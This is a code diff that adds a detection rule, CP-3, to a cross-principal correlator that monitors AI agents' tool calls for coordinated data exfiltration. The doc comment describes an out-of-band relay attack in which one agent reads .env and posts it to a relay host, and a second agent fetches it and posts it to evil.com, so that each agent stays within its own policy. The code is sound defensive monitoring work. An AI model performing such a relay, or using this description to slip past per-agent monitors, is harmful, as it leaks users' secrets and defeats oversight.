@@ -75,12 +75,23 @@ function extractResourceKey(toolClass: string, action: string, params?: Record<s
  *         Principal B reads shared store resource X + egresses
  *         (resource-key aware: write and read must target the same resource)
  * - CP-2: Any principal with `derived-sensitive` taint attempts HTTP write egress
+ * - CP-3: Multiple principals egress to the same destination host within the
+ *         correlation window, and at least one had a sensitive file read.
+ *         Catches out-of-band relay attacks where Agent A posts to a relay
+ *         and Agent B fetches from the same relay then exfiltrates elsewhere.
  */
 export class CrossPrincipalCorrelator {
 	private readonly windowMs: number;
 	private readonly maxEvents: number;
 	private readonly events = new Map<string, PrincipalEvent[]>();
 	private readonly handlers: AlertHandler[] = [];
+	/**
+	 * Tracks recent egress destinations: hostname → set of {principalId, timestamp}.
+	 * Used by CP-3 to detect multiple principals converging on the same host.
+	 */
+	private readonly egressHosts = new Map<string, { principalId: string; timestamp: string }[]>();
+	/** Hosts that have already fired a CP-3 alert (deduplicate within window). */
+	private readonly cp3FiredHosts = new Set<string>();
 
 	constructor(config?: CorrelatorConfig) {
 		this.windowMs = config?.windowMs ?? 60_000;
@@ -123,6 +134,7 @@ export class CrossPrincipalCorrelator {
 
 		this.evaluateCP1(pe);
 		this.evaluateCP2(pe);
+		this.evaluateCP3(pe);
 	}
 
 	/**
@@ -242,6 +254,106 @@ export class CrossPrincipalCorrelator {
 				],
 			});
 		}
+	}
+
+	/**
+	 * CP-3: Egress-destination convergence.
+	 * Multiple principals egress (any HTTP verb) to the same host within the window,
+	 * and at least one principal had a recent sensitive file read.
+	 *
+	 * Catches the out-of-band relay pattern:
+	 *   Agent A: read(.env) → http.post(relay.com)   ← allowed by A's policy
+	 *   Agent B: http.get(relay.com) → http.post(evil.com) ← allowed by B's policy
+	 * Neither individual flow violates policy, but the convergence on relay.com is suspicious.
+	 */
+	private evaluateCP3(triggerEvent: PrincipalEvent): void {
+		if (triggerEvent.toolClass !== "http") return;
+
+		const url = triggerEvent.params?.url as string | undefined;
+		if (!url) return;
+
+		let hostname: string;
+		try {
+			hostname = new URL(url).hostname;
+		} catch {
+			return;
+		}
+
+		// Record this egress
+		let hostEntries = this.egressHosts.get(hostname);
+		if (!hostEntries) {
+			hostEntries = [];
+			this.egressHosts.set(hostname, hostEntries);
+		}
+		hostEntries.push({
+			principalId: triggerEvent.principalId,
+			timestamp: triggerEvent.timestamp,
+		});
+
+		// Prune expired entries
+		const cutoff = Date.now() - this.windowMs;
+		const active = hostEntries.filter(
+			(e) => new Date(e.timestamp).getTime() >= cutoff,
+		);
+		this.egressHosts.set(hostname, active);
+
+		// Prune expired CP-3 dedup entries
+		// (simple: clear fired hosts when their entries are fully expired)
+		for (const [firedHost] of this.cp3FiredHosts.entries()) {
+			const firedEntries = this.egressHosts.get(firedHost);
+			if (!firedEntries || firedEntries.length === 0) {
+				this.cp3FiredHosts.delete(firedHost);
+			}
+		}
+
+		// Need ≥2 distinct principals hitting this host
+		const distinctPrincipals = new Set(active.map((e) => e.principalId));
+		if (distinctPrincipals.size < 2) return;
+
+		// Already fired for this host in this window?
+		if (this.cp3FiredHosts.has(hostname)) return;
+
+		// At least one principal must have a recent sensitive read
+		const principalsWithSensitiveRead: string[] = [];
+		for (const pid of distinctPrincipals) {
+			const buffer = this.events.get(pid) ?? [];
+			const hasSensitiveRead = buffer.some(
+				(e) =>
+					new Date(e.timestamp).getTime() >= cutoff &&
+					e.toolClass === "file" &&
+					e.action === "read" &&
+					e.params?.path &&
+					SENSITIVE_PATH_PATTERNS.some((p) => p.test(String(e.params!.path))),
+			);
+			if (hasSensitiveRead) {
+				principalsWithSensitiveRead.push(pid);
+			}
+		}
+
+		if (principalsWithSensitiveRead.length === 0) return;
+
+		this.cp3FiredHosts.add(hostname);
+
+		// Build event list from active entries
+		const alertEvents = active.map((e) => ({
+			principalId: e.principalId,
+			toolClass: "http",
+			action: triggerEvent.action,
+			timestamp: e.timestamp,
+		}));
+
+		this.emit({
+			alertId: generateId(),
+			ruleId: "cross-principal-egress-convergence",
+			severity: "high",
+			timestamp: now(),
+			principals: Array.from(distinctPrincipals),
+			reason:
+				`Multiple principals (${Array.from(distinctPrincipals).join(", ")}) egressed to the same host '${hostname}' ` +
+				`within ${this.windowMs / 1000}s. Principals with sensitive reads: ${principalsWithSensitiveRead.join(", ")}. ` +
+				`Possible out-of-band relay attack.`,
+			events: alertEvents,
+		});
 	}
 
 	private emit(alert: CrossPrincipalAlert): void {
